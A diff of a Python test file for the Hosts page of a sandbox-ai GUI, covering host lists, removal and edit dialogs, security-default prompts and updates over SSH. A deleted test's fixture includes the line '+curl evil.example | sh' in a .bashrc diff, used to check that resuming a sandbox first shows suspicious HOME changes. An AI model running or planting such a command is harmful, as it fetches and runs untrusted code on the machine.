@@ -1,5 +1,6 @@
-"""The Hosts page (offscreen): the hosts of sandbox-ai hosts, and for one of them its starts, approvals, doctor and
-the agents' telemetry, each through sandbox-ai hosts run (here a stand-in that records what it was asked)."""
+"""The Hosts page (offscreen): the hosts of sandbox-ai hosts with what the Sandboxes and Approvals pages last saw of
+them, the way to those pages filtered by a host, editing and removing a host, and a host's defaults, each through
+sandbox-ai hosts run (here a stand-in that records what it was asked)."""
 import json
 import os
 
@@ -26,50 +27,143 @@ def env(tmp_path, monkeypatch):
     return tmp_path
 
 
-def test_hosts_starts_approvals_and_telemetry(qapp, env, monkeypatch):
+def choose(page, name):
+    """Select the row of host NAME."""
+    page.table.clearSelection()
+    page.table.selectRow(widgets.find_row(page.table, name))
+
+
+def test_the_hosts_list_shows_the_fleet_and_leads_to_its_starts_and_questions(qapp, env, monkeypatch):
+    """One row per host with what the other pages last saw: whether it answered (and when), its version, the starts
+    running there and the questions waiting; Show starts and Show questions name the host for the Sandboxes and
+    Approvals pages; the page itself asks no host for that (no SSH but its defaults when shown)."""
+    import time
     sai = backend.SandboxAI()
     if not sai.hosts_supported():
         pytest.skip("this sandbox-ai has no hosts.py")
     sai.host_add("ct1", "admin@192.0.2.10", 2222, "", "Proxmox 101")
+    sai.host_add("ct2", "admin@192.0.2.11", 22, "", "")
     asked = []
-    answers = {("list", "--json"): [{"name": "web", "agent": "claude", "state": "running", "attachable": True,
-                                     "workspace": "/srv/app", "started": "2026-11-05T10:00:00Z"}],
-               ("approvals", "list", "--json"): [{"id": "1-2-3", "question": "connect to 192.0.2.7:443",
-                                                  "sandbox": "claude-1"}],
-               ("defaults", "show", "--json"): {"path": "/home/admin/.config/sandbox-ai/defaults.json",
-                                                "values": {"telemetry": "strict"},
-                                                "telemetry_levels": ["off", "strict", "on"]}}
+    monkeypatch.setattr(sai, "host_run", lambda name, *args, timeout=120: asked.append((name, args)) or (0, "{}", ""))
+    page = HostsPage(sai, lambda argv, title: None)
+    assert page.table.row_keys == ["local", "ct1", "ct2"] and asked == [], "built: no command, no SSH"
+    assert page.table.item(widgets.find_row(page.table, "ct1"), 1).text() == "admin@192.0.2.10:2222"
+    assert not hasattr(page, "starts") and not hasattr(page, "questions"), "their actions are on their own pages"
+    page.set_fleet({"local": {"running": 1, "seen": time.time(), "problem": None},
+                    "ct1": {"running": 2, "seen": time.time(), "problem": None},
+                    "ct2": {"running": 0, "seen": time.time() - 30, "problem": "ssh: timed out"}})
+    page.set_questions({"ct1": 3})
+    row = {name: [page.table.item(widgets.find_row(page.table, name), c).text() for c in range(6)]
+           for name in ("local", "ct1", "ct2")}
+    assert row["ct1"][2] == "yes" and row["ct1"][4] == "2" and row["ct1"][5] == "3"
+    assert row["ct2"][2].startswith("no answer (last seen ") and row["ct2"][5] == ""
+    assert row["local"][2] == "yes" and row["local"][4] == "1"
+    starts, questions, refreshed = [], [], []
+    page.show_starts.connect(starts.append)
+    page.show_questions.connect(questions.append)
+    page.refresh_requested.connect(lambda: refreshed.append(True))
+    choose(page, "ct1")
+    page.starts_button.click()
+    page.questions_button.click()
+    page.refresh_button.click()
+    assert starts == ["ct1"] and questions == ["ct1"] and refreshed == [True]
+    assert all(page.table.accessibleName() and b.accessibleName() for b in (page.starts_button, page.edit_button))
+    choose(page, "local")
+    assert not page.remove_button.isEnabled() and not page.edit_button.isEnabled(), "this machine stays"
+    page.close()
+
+
+def test_remove_asks_first_and_the_other_pages_hear_of_it(qapp, env, monkeypatch):
+    sai = backend.SandboxAI()
+    if not sai.hosts_supported():
+        pytest.skip("this sandbox-ai has no hosts.py")
+    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
+    monkeypatch.setattr(widgets, "SHOWN", [])
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)  # Cancel
+    page = HostsPage(sai, lambda argv, title: None)
+    removed = []
+    page.host_removed.connect(removed.append)
+    choose(page, "ct1")
+    page.remove()
+    title, text, _ = widgets.SHOWN[-1]
+    assert title == "Remove host" and "ct1" in text
+    assert [e["name"] for e in sai.host_entries()] == ["local", "ct1"] and removed == [], "declined: still listed"
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.remove()
+    assert [e["name"] for e in sai.host_entries()] == ["local"] and removed == ["ct1"]
+    assert page.table.row_keys == ["local"]
+    page.close()
+
+
+def test_edit_host_changes_what_hosts_set_changes(qapp, env, monkeypatch):
+    """Edit… runs `sandbox-ai hosts set NAME --update-sudo on|off`; the address and the key are only shown."""
+    import sandbox_ai_app.hosts_page as hp
+    sai = backend.SandboxAI()
+    if not sai.hosts_supported():
+        pytest.skip("this sandbox-ai has no hosts.py")
+    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
+    dialog = hp.EditHostDialog(sai.host_entries()[1])
+    assert dialog.windowTitle() == "Edit ct1" and not dialog.sudo.isChecked()
+    assert not dialog.findChildren(QtWidgets.QLineEdit), "SSH, port and key are not edited here"
+    dialog.deleteLater()
+
+    class Accepting(hp.EditHostDialog):
+        def exec(self):
+            self.sudo.setChecked(True)
+            return QtWidgets.QDialog.DialogCode.Accepted
+    monkeypatch.setattr(hp, "EditHostDialog", Accepting)
+    page = HostsPage(sai, lambda argv, title: None)
+    choose(page, "ct1")
+    page.edit()
+    assert sai.host_entries()[1].get("update_sudo") is True
+    page.close()
+
+
+def test_a_hosts_defaults_and_a_step_down_in_security_asks_first(qapp, env, monkeypatch):
+    """The Defaults tab reads `sandbox-ai defaults show --json` of the chosen host when the page is shown; saving
+    writes each change with defaults set/unset there; a lower security mode, fewer canaries, more telemetry or an
+    expiry of kept starts is asked first (Cancel the default)."""
+    import sandbox_ai_app.hosts_page as hp
+    sai = backend.SandboxAI()
+    if not sai.hosts_supported():
+        pytest.skip("this sandbox-ai has no hosts.py")
+    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
+    asked = []
+    shown = {"path": "/home/admin/.config/sandbox-ai/defaults.json",
+             "values": {"mode": "high", "canaries": ["credentials", "home"], "telemetry": "off"},
+             "telemetry_levels": ["off", "strict", "on"], "modes": list(hp.MODES),
+             "canary_categories": ["credentials", "home", "workspace"], "canary_default": ["credentials", "home"]}
 
     def host_run(name, *args, timeout=120):
         asked.append((name, args))
-        return 0, json.dumps(answers.get(tuple(args), {})), ""
+        return 0, json.dumps(shown) if args[:2] == ("defaults", "show") else "ok", ""
     monkeypatch.setattr(sai, "host_run", host_run)
-    opened = []
-    page = HostsPage(sai, lambda argv, title: opened.append((argv, title)))
-    assert [page.list.item(i).data(0x0100) for i in range(page.list.count())] == ["local", "ct1"]
-    page.list.setCurrentRow(1)
-    assert asked == [], "a page nobody opened asks no host (no command, no SSH at every start of the app)"
+    monkeypatch.setattr(widgets, "SHOWN", [])
+    page = HostsPage(sai, lambda argv, title: None)
+    choose(page, "ct1")
+    assert asked == [], "not shown yet: nothing asked"
     page.show()
-    assert asked and asked[0][0] == "ct1", "shown: the selected host is asked"
-    assert page.starts.rowCount() == 1 and page.starts.item(0, 0).text() == "web"
-    assert page.questions.rowCount() == 1 and page.telemetry.currentData() == "strict"
-    page.starts.selectRow(0)
-    page.attach()
-    argv, title = opened[-1]
-    assert argv[0] == "ssh" and "-tt" in argv and argv[-1].endswith("attach web; fi") and title == "ct1: web"
-    page.start_action("stop")
-    assert ("ct1", ("stop", "web")) in asked
-    page.questions.selectRow(0)
-    page.scope.setCurrentIndex(page.scope.findData("run"))
-    page.answer("allow")
-    assert ("ct1", ("approvals", "allow", "1-2-3", "--scope", "run")) in asked
-    page.telemetry.setCurrentIndex(page.telemetry.findData("off"))
-    page.set_telemetry()
-    assert ("ct1", ("defaults", "unset", "telemetry")) in asked
-    page.list.setCurrentRow(1)
-    page.remove()
+    assert ("ct1", ("defaults", "show", "--json")) in asked
+    assert page.mode.currentData() == "high" and page.canaries.currentData() == hp.CANARY_LIST
+    assert page.canary_list.text() == "credentials, home" and page.telemetry.currentData() == "off"
+    page.mode.setCurrentIndex(page.mode.findData("low"))
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)
+    page.save_defaults()
+    title, text, _ = widgets.SHOWN[-1]
+    assert title.startswith("Defaults of ct1") and "from high down to low" in text
+    assert not [a for _, a in asked if a[:2] == ("defaults", "set")], "declined: nothing written"
+    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
+    page.save_defaults()
+    assert ("ct1", ("defaults", "set", "mode", '"low"')) in asked
+    # Stricter: written without a question.
+    page.mode.setCurrentIndex(page.mode.findData("paranoid"))
+    widgets.SHOWN.clear()
+    page.save_defaults()
+    assert ("ct1", ("defaults", "set", "mode", '"paranoid"')) in asked and not widgets.SHOWN
+    assert hp.security_steps_down({"canaries": ["credentials", "home"]}, {"canaries": False})
+    assert hp.security_steps_down({}, {"keep_days": 30}) and not hp.security_steps_down({}, {"mode": "high"})
+    assert hp.security_steps_down({}, {"telemetry": "on"}) and hp.security_steps_down({}, {"mode": "low"})
     page.close()
-    assert [e["name"] for e in sai.host_entries()] == ["local"]
 
 
 def test_versions_update_and_update_all(qapp, env, monkeypatch):
@@ -96,15 +190,15 @@ def test_versions_update_and_update_all(qapp, env, monkeypatch):
     monkeypatch.setattr(sai, "host_update_terminal", lambda name: ["ssh", "-tt", name, "sudo"])
     monkeypatch.setattr(sai, "host_run", lambda name, *args, timeout=120: (0, "[]" if args[0] != "defaults" else "{}", ""))
     page = HostsPage(sai, lambda argv, title: opened.append((argv, title)))
-    texts = [page.list.item(i).text() for i in range(page.list.count())]
+    texts = [page.table.item(r, 3).text() for r in range(page.table.rowCount())]
     assert "0.1.60, update: 0.1.66" in texts[1] and "0.1.66, up to date" in texts[2], texts
-    page.list.setCurrentRow(1)
+    choose(page, "ct1")
     page.update_host()
     assert asked == [("ct1", None)]
     log = page.updates.toPlainText()
     assert "ct1: 0.1.60 -> 0.1.66" in log and "made private (0600)" in log and "1 hosts: 1 updated" in log
     # one host whose installation is root's: asked whether with sudo (yes), then sudo wants a password: a terminal
-    page.list.setCurrentRow(2)
+    choose(page, "ct2")
     page.update_host()
     assert asked[-2:] == [("ct2", None), ("ct2", True)]
     assert opened == [(["ssh", "-tt", "ct2", "sudo"], "ct2: update")]
@@ -114,157 +208,8 @@ def test_versions_update_and_update_all(qapp, env, monkeypatch):
     page.update_all()
     assert [name for name, _ in asked] == ["ct1", "ct2"]
     assert "2 hosts: 1 updated, 0 up to date, 1 not updated" in page.updates.toPlainText()
-    page.list.setCurrentRow(0)
+    choose(page, "local")
     page.update_host()  # this machine: not over SSH
-    page.close()
-
-
-def test_a_chosen_host_never_shows_another_hosts_starts(qapp, env, monkeypatch):
-    """Chosen while this machine's starts are shown, a host over SSH (slow, or not answering) shows an empty pane
-    under its own name until it answers, never this machine's starts; a late answer for a host chosen before is
-    dropped; the pane says which host it shows."""
-    sai = backend.SandboxAI()
-    if not sai.hosts_supported():
-        pytest.skip("this sandbox-ai has no hosts.py")
-    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
-    import sandbox_ai_app.hosts_page as hp
-    pending = []
-    monkeypatch.setattr(hp, "background", lambda function, *args, done, **kw: pending.append((function, args, done)))
-    starts = {"local": [{"name": "here", "agent": "claude", "state": "running", "workspace": "/w", "started": "x"}],
-              "ct1": [{"name": "there", "agent": "codex", "state": "running", "workspace": "/srv", "started": "y"}]}
-    failing = set()
-
-    def host_run(name, *args, timeout=120):
-        if name in failing:
-            return 255, "", "ssh: connect to host 192.0.2.10 port 22: Connection timed out"
-        if args[:1] == ("list",):
-            return 0, json.dumps(starts[name]), ""
-        return 0, json.dumps([] if args[0] == "approvals" else {}), ""
-    monkeypatch.setattr(sai, "host_run", host_run)
-
-    def finish(index=0):
-        function, args, done = pending.pop(index)
-        try:
-            result, error = function(*args), None
-        except Exception as exc:  # noqa: BLE001 - as background() hands it to done
-            result, error = None, exc
-        done(result, error)
-    page = HostsPage(sai, lambda argv, title: None)
-    page.list.setCurrentRow(0)
-    page.show()
-    finish()
-    assert page.starts.item(0, 0).text() == "here" and "this machine" in page.pane_title.text()
-    page.list.setCurrentRow(1)  # ct1: asked, its answer not there yet
-    assert page.starts.rowCount() == 0, "this machine's starts must not stand under ct1"
-    assert "ct1" in page.pane_title.text()
-    page.list.setCurrentRow(0)
-    page.list.setCurrentRow(1)
-    # Answers arrive in the order asked: ct1's first ask, this machine's, ct1's second: only the last one counts.
-    while len(pending) > 1:
-        finish()
-        assert page.starts.rowCount() == 0 or page.starts.item(0, 0).text() == "there"
-    finish()
-    assert page.starts.item(0, 0).text() == "there" and "1 starts" in page.pane_title.text()
-    failing.add("ct1")
-    page.refresh_host()
-    finish()
-    assert page.starts.rowCount() == 0 and "no answer" in page.pane_title.text()
-    # While shown, the page asks again by itself (one ask at a time), and stops when hidden.
-    assert page.timer.isActive()
-    failing.clear()
-    page.tick()
-    page.tick()
-    assert len(pending) == 1
-    finish()
-    assert page.starts.item(0, 0).text() == "there"
-    page.close()
-    assert not page.timer.isActive()
-
-
-def test_stop_and_remove_ask_first_naming_the_host_and_the_start(qapp, env, monkeypatch):
-    """Regression: Stop and Remove host acted at one click. Both ask now (Cancel is the default), naming the host and
-    the start."""
-    sai = backend.SandboxAI()
-    if not sai.hosts_supported():
-        pytest.skip("this sandbox-ai has no hosts.py")
-    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
-    asked = []
-    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
-               "started": "x"}]
-
-    def host_run(name, *args, timeout=120):
-        asked.append((name, args))
-        return 0, json.dumps(starts if args[0] == "list" else [] if args[0] == "approvals" else {}), ""
-    monkeypatch.setattr(sai, "host_run", host_run)
-    monkeypatch.setattr(widgets, "SHOWN", [])
-    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)  # Cancel
-    page = HostsPage(sai, lambda argv, title: None)
-    page.list.setCurrentRow(1)
-    page.show()
-    page.starts.selectRow(0)
-    page.start_action("stop")
-    title, text, _ = widgets.SHOWN[-1]
-    assert title == "Stop" and "ct1" in text and "web" in text
-    assert ("ct1", ("stop", "web")) not in asked
-    page.remove()
-    title, text, _ = widgets.SHOWN[-1]
-    assert title == "Remove host" and "ct1" in text
-    assert [e["name"] for e in sai.host_entries()] == ["local", "ct1"], "declined: still listed"
-    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
-    page.start_action("stop")
-    assert ("ct1", ("stop", "web")) in asked
-    page.close()
-
-
-def test_the_starts_buttons_follow_the_state_and_the_selection_stays_across_a_refresh(qapp, env, monkeypatch):
-    from sandbox_ai_app import i18n
-    sai = backend.SandboxAI()
-    if not sai.hosts_supported():
-        pytest.skip("this sandbox-ai has no hosts.py")
-    sai.host_add("ct1", "admin@192.0.2.10", 22, "", "")
-    asked = []
-    starts = [{"name": "web", "agent": "claude", "state": "running", "attachable": True, "workspace": "/srv",
-               "started": "x"},
-              {"name": "old", "agent": "codex", "state": "stopped", "workspace": "/srv/old", "started": "y"}]
-    review = {"name": "old", "state": "stopped", "pending": True,
-              "review": {"since": "2026-11-07T10:00:00Z", "complete": True,
-                         "changes": [{"path": ".bashrc", "change": "changed", "diff": "+curl evil.example | sh"}]}}
-
-    def host_run(name, *args, timeout=120):
-        asked.append((name, args))
-        if args[0] == "list":
-            return 0, json.dumps(starts), ""
-        if args[:2] == ("resume", "old") and "--review-home" in args:
-            return 0, json.dumps(review), ""
-        return 0, json.dumps([] if args[0] == "approvals" else {}), ""
-    monkeypatch.setattr(sai, "host_run", host_run)
-    monkeypatch.setattr(widgets, "SHOWN", [])
-    i18n.set_language("de")
-    page = HostsPage(sai, lambda argv, title: None)
-    page.list.setCurrentRow(1)
-    page.show()
-    states = [page.starts.item(r, 2).text() for r in range(2)]
-    assert states == [i18n.tr("running"), i18n.tr("stopped")] and "gestoppt" in states, "the states are translated"
-    i18n.set_language("en")
-    page.starts.selectRow(1)
-    enabled = {action: button.isEnabled() for action, button in page.action_buttons.items()}
-    assert enabled == {"pause": False, "resume": True, "stop": False} and not page.attach_button.isEnabled()
-    starts.reverse()  # read again (every 20 s): another order; the selection stays on its start
-    page.refresh_host(quiet=True)
-    assert page.chosen_start()["name"] == "old" and page.action_buttons["resume"].isEnabled()
-    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "web"][0])
-    assert page.action_buttons["pause"].isEnabled() and page.attach_button.isEnabled()
-    assert not page.action_buttons["resume"].isEnabled()
-    # Resuming a stopped kept start: what changed in its HOME first.
-    page.starts.selectRow([r for r in range(2) if page.starts.item(r, 0).text() == "old"][0])
-    monkeypatch.setattr(widgets, "AUTO_ANSWER", False)
-    page.start_action("resume")
-    title, text, details = widgets.SHOWN[-1]
-    assert title == "Resume old on ct1" and ".bashrc" in text and "evil.example" in details
-    assert ("ct1", ("resume", "old")) not in asked
-    monkeypatch.setattr(widgets, "AUTO_ANSWER", True)
-    page.start_action("resume")
-    assert ("ct1", ("resume", "old")) in asked
     page.close()
 
 
